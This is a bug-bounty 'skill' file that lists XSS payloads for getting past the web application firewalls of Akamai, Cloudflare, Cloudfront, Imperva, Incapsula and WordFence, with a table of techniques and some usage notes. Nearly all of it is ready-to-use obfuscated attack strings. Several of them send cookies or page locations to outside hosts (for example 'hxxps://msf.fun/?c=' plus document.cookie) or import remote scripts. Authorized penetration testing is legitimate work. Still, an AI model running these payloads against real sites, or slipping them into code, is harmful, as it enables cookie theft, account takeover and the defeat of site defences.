---
name: "xss-waf-bypass"
version: "2.0"
category: "injection"
subcategory: "waf-bypass"
phase: "exploitation"
tags: ["akamai", "bug-bounty", "bypass", "cloudflare", "imperva", "injection", "waf-bypass", "xss"]
tools: ["burp-intruder", "adb", "burp", "ghauri", "sqlmap"]
follow_up_skills: ["xss", "xss-polyglot"]
prerequisite_skills: ["xss", "cross-site-scripting"]
description: "Bug bounty skill: xss waf bypass - exploitation phase, injection category"
---
# XSS WAF Bypass Payloads

## Summary

WAF-specific XSS payloads organized by vendor — Akamai, Cloudflare, Cloudfront, Imperva, Incapsula, and WordFence. Each WAF has unique filtering quirks that these payloads exploit.

---

## Akamai XSS Payloads

```
<style>@keyframes a{}b{animation:a;}</style><b/onanimationstart=prompt`${document.domain}`>
<marquee+loop=1+width=0+onfinish='new+Function`al\ert\`1\``'>
<svg><circle><set onbegin=prompt(1) attributename=fill>
<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
"%3balert`1`%3b"
asd"`> onpointerenter=x=prompt,x`XSS`
<x onauxclick=import('//1152848220/')>click
<x onauxclick=a=alert,a(domain)>click
<x onauxclick=import('//xss/')>click
\"<>onauxclick<>=(eval)(atob(`YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==`))>+<sss
{{constructor.constructor(alert`1`)()}}
javascript:new%20Function`al\ert\`1\``;
<script>Object.prototype.BOOMR = 1;Object.prototype.url='https://portswigger-labs.net/xss/xss.js'</script>
"><a/\test="%26quot;x%26quot;"href='%01javascript:/*%b1*/;location.assign("//hackerone.com/stealthy?x="+location)'>Click
```

---

## Cloudflare XSS Payloads

```
<a"/onclick=(confirm)()>Click Here!
Dec: <svg onload=prompt%26%230000000040document.domain)>
Hex: <svg onload=prompt%26%23x000000028;document.domain)>
xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
<--%253cimg%20onerror=alert(1)%20src=a%253e --!>
<a+HREF='%26%237javascrip%26%239t:alert%26lpar;document.domain)'>
javascript:{ alert`0` }
1'"><img/src/onerror=.1|alert``>
<img src=x onError=import('//1152848220/')>
%2sscript%2ualert()%2s/script%2u
<svg on onload=(alert)(document.domain)>
<img ignored=() src=x onerror=prompt(1)>
<svg onx=() onload=(confirm)(1)>
“><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;
<svg on =i onload=alert(domain)
<svg/onload=location/**/='https://your.server/'+document.domain>
<svg onx=() onload=window.alert?.()>
test",prompt%0A/*HelloWorld*/(document.domain)
"onx+%00+onpointerenter%3dalert(domain)+x"
"><svg%20onload=alert%26%230000000040"1")>
%27%09);%0d%0a%09%09[1].find(alert)//
"><img src=1 onmouseleave=print()>
<svg on onload=(alert)(document.domain)>
<svg/on%20onload=alert(1)>
<img/src=x onError="`${x}`;alert(`Ex.Mi`);">
```

---

## Cloudfront XSS Payloads

```
">%0D%0A%0D%0A<x '="foo"><x foo='><img src=x onerror=javascript:alert(`cloudfrontbypass`)//'>
">'><details/open/ontoggle=confirm('XSS')>
6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/
&quot;&gt;&lt;img src=x onerror=confirm(1);&gt;
```

---

## Imperva (Incapsula) XSS Payloads

```
<x/onclick=globalThis&lsqb;'\u0070r\u006f'+'mpt']&lt;)>clickme
tarun"><x/onafterscriptexecute=confirm%26lpar;)//
<a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />click
<details/open/ontoggle="self['wind'%2b'ow']['one'%2b'rror']=self['wind'%2b'ow']['ale'%2b'rt'];throw/**/self['doc'%2b'ument']['domain'];">
<svg onload\r\n=$.globalEval("al"+"ert()");>
<bleh/onclick=top[/al/.source+/ert/.source]&Tab;``>click
<sVg OnPointerEnter="location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//</div">
<a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='test'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />tap
```

---

## Incapsula XSS Payloads

```
<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';>
<iframe/onload="var b = 'document.domain)'; var a = 'JaV' + 'ascRipt:al' + 'ert(' + b; this['src']=a">
<audio autoplay onloadstart=this.src='hxxps://msf.fun/?c='+document["cook"+"ie"]' src=x>
<img/src=q onerror='new Function`al\ert\`1\``'>
<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
<svg onload\r\n=$.globalEval("al"+"ert()");>
[1].map(alert)
(alert)(1)
<"><details/open/ontoggle="jAvAsCrIpT&colon;alert&lpar;/xss-by-tarun/&rpar;">XXXXX</a>
[1].find(confirm)
<svg/onload=self[`aler`%2b`t`]`1`>
%22%3E%3Cobject%20data=data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==%3E%3C/object%3E
'-[document.domain].map(alert)-'
```

---

## WordFence XSS Payloads

```
ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6
'">><div><meter onmouseover="alert(1)"</div>"
>><marquee loop=1 width=0 onfinish=alert(1)>
<a href=&#01javascript:alert(1)>
<a/href=%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x0a;:alert(1)>please%20click%20here</a>
```

## Techniques Summary

| WAF | Common Bypass Technique |
|-----|------------------------|
| **Akamai** | CSS `@keyframes` + `onanimationstart`, `onauxclick`, `constructor.constructor`, ES6 tagged templates |
| **Cloudflare** | HTML entity encoding (`%26%230000000040` = `@`), JSFuck-style obfuscation, `onpointerenter`, `window.alert?.()` optional chaining |
| **Cloudfront** | CRLF injection (`%0D%0A`), `details/open/ontoggle` |
| **Imperva** | `globalThis`, unicode escapes (`\u0070`), string concatenation with `%2b`, `source` property of regex literals |
| **Incapsula** | `$.globalEval`, `map`/`find` on arrays, base64 data URIs, `self[`aler`%2b`t`]` |
| **WordFence** | Double URL encoding (`%2522`), null byte prefix (`&#01`), hex entity encoding |

## Notes

- WAF bypass payloads are often version-specific — test across multiple payload categories if one fails
- HTML entity encoding, unicode escapes, and `&NewLine;` / `&Tab;` entities are common across WAF bypasses
- `onauxclick` requires a click event to fire (mapped to middle mouse button by default)
- Base64-encoded data URIs bypass WAFs that inspect request bodies but not rendered content
- Array method abuse (`[1].map(alert)`, `[1].find(confirm)`) is a compact, often-overlooked execution pattern
